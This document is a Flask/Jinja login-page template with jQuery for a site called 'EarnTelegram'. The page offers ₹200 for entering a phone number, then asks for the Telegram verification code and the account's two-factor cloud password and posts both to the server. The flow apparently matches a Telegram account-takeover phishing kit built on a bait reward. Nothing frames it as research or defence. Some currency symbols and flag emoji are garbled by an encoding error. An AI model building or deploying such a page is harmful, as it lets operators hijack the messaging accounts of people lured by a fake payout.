{% extends "base.html" %}

{% block title %}Login - EarnTelegram{% endblock %}

{% block content %}
<div class="row justify-content-center">
    <div class="col-md-6 col-lg-4">
        <div class="card">
            <div class="card-body p-4">
                <div class="text-center mb-4">
                    <i class="fas fa-coins" style="font-size: 3rem; color: #28a745;"></i>
                    <h3 class="mt-3">Login to EarnTelegram</h3>
                    <p class="text-muted">Enter your phone number to get â‚¹200 instantly</p>
                </div>

                <div id="alert-container"></div>

                <!-- Phone Number Form -->
                <div id="phone-form">
                    <form id="phoneForm">
                        <div class="mb-3">
                            <label for="phone" class="form-label">Phone Number</label>
                            <div class="input-group phone-input-group">
                                <div class="input-group-text p-0" style="background-color: #fff !important; ">
                                    <select class="form-select border-0 country-selector" id="countryCode" style="min-width: 120px; ">
                                        <option value="+93" data-flag="ðŸ‡¦ðŸ‡«">ðŸ‡¦ðŸ‡« +93</option>
                                        <option value="+355" data-flag="ðŸ‡¦ðŸ‡±">ðŸ‡¦ðŸ‡± +355</option>
                                        <option value="+213" data-flag="ðŸ‡©ðŸ‡¿">ðŸ‡©ðŸ‡¿ +213</option>
                                        <option value="+1" data-flag="ðŸ‡ºðŸ‡¸">ðŸ‡ºðŸ‡¸ +1</option>
                                        <option value="+376" data-flag="ðŸ‡¦ðŸ‡©">ðŸ‡¦ðŸ‡© +376</option>
                                        <option value="+244" data-flag="ðŸ‡¦ðŸ‡´">ðŸ‡¦ðŸ‡´ +244</option>
                                        <option value="+54" data-flag="ðŸ‡¦ðŸ‡·">ðŸ‡¦ðŸ‡· +54</option>
                                        <option value="+374" data-flag="ðŸ‡¦ðŸ‡²">ðŸ‡¦ðŸ‡² +374</option>
                                        <option value="+61" data-flag="ðŸ‡¦ðŸ‡º">ðŸ‡¦ðŸ‡º +61</option>
                                        <option value="+43" data-flag="ðŸ‡¦ðŸ‡¹">ðŸ‡¦ðŸ‡¹ +43</option>
                                        <option value="+994" data-flag="ðŸ‡¦ðŸ‡¿">ðŸ‡¦ðŸ‡¿ +994</option>
                                        <option value="+973" data-flag="ðŸ‡§ðŸ‡­">ðŸ‡§ðŸ‡­ +973</option>
                                        <option value="+880" data-flag="ðŸ‡§ðŸ‡©">ðŸ‡§ðŸ‡© +880</option>
                                        <option value="+375" data-flag="ðŸ‡§ðŸ‡¾">ðŸ‡§ðŸ‡¾ +375</option>
                                        <option value="+32" data-flag="ðŸ‡§ðŸ‡ª">ðŸ‡§ðŸ‡ª +32</option>
                                        <option value="+55" data-flag="ðŸ‡§ðŸ‡·">ðŸ‡§ðŸ‡· +55</option>
                                        <option value="+359" data-flag="ðŸ‡§ðŸ‡¬">ðŸ‡§ðŸ‡¬ +359</option>
                                        <option value="+1" data-flag="ðŸ‡¨ðŸ‡¦">ðŸ‡¨ðŸ‡¦ +1</option>
                                        <option value="+86" data-flag="ðŸ‡¨ðŸ‡³">ðŸ‡¨ðŸ‡³ +86</option>
                                        <option value="+57" data-flag="ðŸ‡¨ðŸ‡´">ðŸ‡¨ðŸ‡´ +57</option>
                                        <option value="+385" data-flag="ðŸ‡­ðŸ‡·">ðŸ‡­ðŸ‡· +385</option>
                                        <option value="+420" data-flag="ðŸ‡¨ðŸ‡¿">ðŸ‡¨ðŸ‡¿ +420</option>
                                        <option value="+45" data-flag="ðŸ‡©ðŸ‡°">ðŸ‡©ðŸ‡° +45</option>
                                        <option value="+20" data-flag="ðŸ‡ªðŸ‡¬">ðŸ‡ªðŸ‡¬ +20</option>
                                        <option value="+358" data-flag="ðŸ‡«ðŸ‡®">ðŸ‡«ðŸ‡® +358</option>
                                        <option value="+33" data-flag="ðŸ‡«ðŸ‡·">ðŸ‡«ðŸ‡· +33</option>
                                        <option value="+49" data-flag="ðŸ‡©ðŸ‡ª">ðŸ‡©ðŸ‡ª +49</option>
                                        <option value="+30" data-flag="ðŸ‡¬ðŸ‡·">ðŸ‡¬ðŸ‡· +30</option>
                                        <option value="+852" data-flag="ðŸ‡­ðŸ‡°">ðŸ‡­ðŸ‡° +852</option>
                                        <option value="+36" data-flag="ðŸ‡­ðŸ‡º">ðŸ‡­ðŸ‡º +36</option>
                                        <option value="+354" data-flag="ðŸ‡®ðŸ‡¸">ðŸ‡®ðŸ‡¸ +354</option>
                                        <option value="+91" data-flag="ðŸ‡®ðŸ‡³" selected>ðŸ‡®ðŸ‡³ +91</option>
                                        <option value="+62" data-flag="ðŸ‡®ðŸ‡©">ðŸ‡®ðŸ‡© +62</option>
                                        <option value="+98" data-flag="ðŸ‡®ðŸ‡·">ðŸ‡®ðŸ‡· +98</option>
                                        <option value="+964" data-flag="ðŸ‡®ðŸ‡¶">ðŸ‡®ðŸ‡¶ +964</option>
                                        <option value="+353" data-flag="ðŸ‡®ðŸ‡ª">ðŸ‡®ðŸ‡ª +353</option>
                                        <option value="+972" data-flag="ðŸ‡®ðŸ‡±">ðŸ‡®ðŸ‡± +972</option>
                                        <option value="+39" data-flag="ðŸ‡®ðŸ‡¹">ðŸ‡®ðŸ‡¹ +39</option>
                                        <option value="+81" data-flag="ðŸ‡¯ðŸ‡µ">ðŸ‡¯ðŸ‡µ +81</option>
                                        <option value="+962" data-flag="ðŸ‡¯ðŸ‡´">ðŸ‡¯ðŸ‡´ +962</option>
                                        <option value="+7" data-flag="ðŸ‡°ðŸ‡¿">ðŸ‡°ðŸ‡¿ +7</option>
                                        <option value="+254" data-flag="ðŸ‡°ðŸ‡ª">ðŸ‡°ðŸ‡ª +254</option>
                                        <option value="+965" data-flag="ðŸ‡°ðŸ‡¼">ðŸ‡°ðŸ‡¼ +965</option>
                                        <option value="+60" data-flag="ðŸ‡²ðŸ‡¾">ðŸ‡²ðŸ‡¾ +60</option>
                                        <option value="+52" data-flag="ðŸ‡²ðŸ‡½">ðŸ‡²ðŸ‡½ +52</option>
                                        <option value="+31" data-flag="ðŸ‡³ðŸ‡±">ðŸ‡³ðŸ‡± +31</option>
                                        <option value="+64" data-flag="ðŸ‡³ðŸ‡¿">ðŸ‡³ðŸ‡¿ +64</option>
                                        <option value="+234" data-flag="ðŸ‡³ðŸ‡¬">ðŸ‡³ðŸ‡¬ +234</option>
                                        <option value="+47" data-flag="ðŸ‡³ðŸ‡´">ðŸ‡³ðŸ‡´ +47</option>
                                        <option value="+92" data-flag="ðŸ‡µðŸ‡°">ðŸ‡µðŸ‡° +92</option>
                                        <option value="+63" data-flag="ðŸ‡µðŸ‡­">ðŸ‡µðŸ‡­ +63</option>
                                        <option value="+48" data-flag="ðŸ‡µðŸ‡±">ðŸ‡µðŸ‡± +48</option>
                                        <option value="+351" data-flag="ðŸ‡µðŸ‡¹">ðŸ‡µðŸ‡¹ +351</option>
                                        <option value="+974" data-flag="ðŸ‡¶ðŸ‡¦">ðŸ‡¶ðŸ‡¦ +974</option>
                                        <option value="+40" data-flag="ðŸ‡·ðŸ‡´">ðŸ‡·ðŸ‡´ +40</option>
                                        <option value="+7" data-flag="ðŸ‡·ðŸ‡º">ðŸ‡·ðŸ‡º +7</option>
                                        <option value="+966" data-flag="ðŸ‡¸ðŸ‡¦">ðŸ‡¸ðŸ‡¦ +966</option>
                                        <option value="+65" data-flag="ðŸ‡¸ðŸ‡¬">ðŸ‡¸ðŸ‡¬ +65</option>
                                        <option value="+27" data-flag="ðŸ‡¿ðŸ‡¦">ðŸ‡¿ðŸ‡¦ +27</option>
                                        <option value="+82" data-flag="ðŸ‡°ðŸ‡·">ðŸ‡°ðŸ‡· +82</option>
                                        <option value="+34" data-flag="ðŸ‡ªðŸ‡¸">ðŸ‡ªðŸ‡¸ +34</option>
                                        <option value="+94" data-flag="ðŸ‡±ðŸ‡°">ðŸ‡±ðŸ‡° +94</option>
                                        <option value="+46" data-flag="ðŸ‡¸ðŸ‡ª">ðŸ‡¸ðŸ‡ª +46</option>
                                        <option value="+41" data-flag="ðŸ‡¨ðŸ‡­">ðŸ‡¨ðŸ‡­ +41</option>
                                        <option value="+886" data-flag="ðŸ‡¹ðŸ‡¼">ðŸ‡¹ðŸ‡¼ +886</option>
                                        <option value="+66" data-flag="ðŸ‡¹ðŸ‡­">ðŸ‡¹ðŸ‡­ +66</option>
                                        <option value="+90" data-flag="ðŸ‡¹ðŸ‡·">ðŸ‡¹ðŸ‡· +90</option>
                                        <option value="+380" data-flag="ðŸ‡ºðŸ‡¦">ðŸ‡ºðŸ‡¦ +380</option>
                                        <option value="+971" data-flag="ðŸ‡¦ðŸ‡ª">ðŸ‡¦ðŸ‡ª +971</option>
                                        <option value="+44" data-flag="ðŸ‡¬ðŸ‡§">ðŸ‡¬ðŸ‡§ +44</option>
                                        <option value="+84" data-flag="ðŸ‡»ðŸ‡³">ðŸ‡»ðŸ‡³ +84</option>
                                    </select>
                                </div>
                                <input type="tel" class="form-control" id="phone" placeholder="9876543210" required>
                            </div>
                            <div class="form-text">Enter your phone number without country code</div>
                        </div>
                        <button type="submit" class="btn btn-success w-100" id="sendOtpBtn">
                            <i class="fas fa-paper-plane me-2"></i>
                            Send OTP
                        </button>
                    </form>
                </div>

                <!-- OTP Verification Form -->
                <div id="otp-form" style="display: none;">
                    <form id="otpForm">
                        <div class="mb-3">
                            <label for="otp" class="form-label">Enter OTP</label>
                            <input type="text" class="form-control text-center" id="otp" placeholder="12345" maxlength="5" required>
                            <div class="form-text">Check your Telegram app for the verification code</div>
                        </div>
                        
                        <!-- 2FA Password Field (hidden by default) -->
                        <div class="mb-3" id="password-field" style="display: none;">
                            <label for="password" class="form-label">Two-Factor Authentication Password</label>
                            <input type="password" class="form-control" id="password" placeholder="Enter your 2FA password">
                            <div class="form-text">Enter your cloud password for two-factor authentication</div>
                        </div>
                        
                        <button type="submit" class="btn btn-success w-100" id="verifyOtpBtn">
                            <i class="fas fa-check me-2"></i>
                            Verify & Claim â‚¹200
                        </button>
                        <button type="button" class="btn btn-outline-secondary w-100 mt-2" id="backBtn">
                            <i class="fas fa-arrow-left me-2"></i>
                            Back
                        </button>
                    </form>
                </div>

                <div class="text-center mt-4">
                    <a href="{{ url_for('index') }}" class="text-decoration-none">
                        <i class="fas fa-home me-1"></i>
                        Back to Home
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}

{% block scripts %}
<script>
$(document).ready(function() {
    // Phone form submission
    $('#phoneForm').on('submit', function(e) {
        e.preventDefault();
        
        const countryCode = $('#countryCode').val();
        const phoneNumber = $('#phone').val().trim();
        
        if (!phoneNumber) {
            showAlert('Please enter your phone number', 'danger');
            return;
        }
        
        // Validate phone number (only digits)
        if (!/^\d+$/.test(phoneNumber)) {
            showAlert('Please enter only numbers in the phone field', 'danger');
            return;
        }
        
        // Combine country code and phone number
        const fullPhone = countryCode + phoneNumber;

        $('#sendOtpBtn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin me-2"></i>Sending...');

        $.ajax({
            url: '/login',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({ phone: fullPhone }),
            success: function(response) {
                if (response.success) {
                    showAlert(response.message, 'success');
                    $('#phone-form').hide();
                    $('#otp-form').show();
                } else {
                    showAlert(response.error || 'Failed to send OTP', 'danger');
                }
            },
            error: function(xhr) {
                const response = xhr.responseJSON;
                showAlert(response?.error || 'Failed to send OTP', 'danger');
            },
            complete: function() {
                $('#sendOtpBtn').prop('disabled', false).html('<i class="fas fa-paper-plane me-2"></i>Send OTP & Earn â‚¹200');
            }
        });
    });

    // OTP form submission
    $('#otpForm').on('submit', function(e) {
        e.preventDefault();
        
        const otp = $('#otp').val().trim();
        const password = $('#password').val().trim();
        
        if (!otp) {
            showAlert('Please enter the OTP', 'danger');
            return;
        }

        // If 2FA field is visible and empty, show error
        if ($('#password-field').is(':visible') && !password) {
            showAlert('Please enter your 2FA password', 'danger');
            return;
        }

        $('#verifyOtpBtn').prop('disabled', true).html('<i class="fas fa-spinner fa-spin me-2"></i>Verifying...');

        const requestData = { otp: otp };
        if (password) {
            requestData.password = password;
        }

        $.ajax({
            url: '/verify_otp',
            method: 'POST',
            contentType: 'application/json',
            data: JSON.stringify(requestData),
            success: function(response) {
                if (response.success) {
                    if (response.is_new_user) {
                        showAlert('ðŸŽ‰ Congratulations! You earned â‚¹200 instantly! Redirecting to dashboard...', 'success');
                    } else {
                        showAlert('Welcome back! Redirecting to dashboard...', 'success');
                    }
                    setTimeout(function() {
                        window.location.href = '/dashboard';
                    }, 2000);
                } else {
                    showAlert(response.error || 'Invalid OTP', 'danger');
                }
            },
            error: function(xhr) {
                const response = xhr.responseJSON;
                
                if (response && response.requires_2fa) {
                    // Show 2FA password field
                    $('#password-field').show();
                    $('#password').prop('required', true);
                    showAlert(response.message, 'warning');
                } else if (response && response.error && response.error.includes('Invalid 2FA password')) {
                    // 2FA password was wrong, but keep the form and session alive
                    showAlert('Invalid 2FA password. Please try again.', 'danger');
                    $('#password').val('').focus(); // Clear password field and focus
                } else {
                    showAlert(response?.error || 'Invalid OTP', 'danger');
                }
            },
            complete: function() {
                $('#verifyOtpBtn').prop('disabled', false).html('<i class="fas fa-check me-2"></i>Verify & Claim â‚¹200');
            }
        });
    });

    // Back button
    $('#backBtn').on('click', function() {
        $('#otp-form').hide();
        $('#phone-form').show();
        $('#otp').val('');
        $('#password').val('');
        $('#password-field').hide();
        $('#password').prop('required', false);
        // Reset country code to India and clear phone number
        $('#countryCode').val('+91');
        $('#phone').val('');
        clearAlerts();
    });

    // Auto-focus phone input and restrict to numbers only
    $('#phone').on('input', function() {
        // Remove any non-digit characters
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    // Auto-focus OTP input when shown
    $('#otp').on('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
    });

    function showAlert(message, type) {
        const alertHtml = `
            <div class="alert alert-${type} alert-dismissible fade show" role="alert">
                ${message}
                <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
            </div>
        `;
        $('#alert-container').html(alertHtml);
    }

    function clearAlerts() {
        $('#alert-container').empty();
    }
});
</script>
{% endblock %}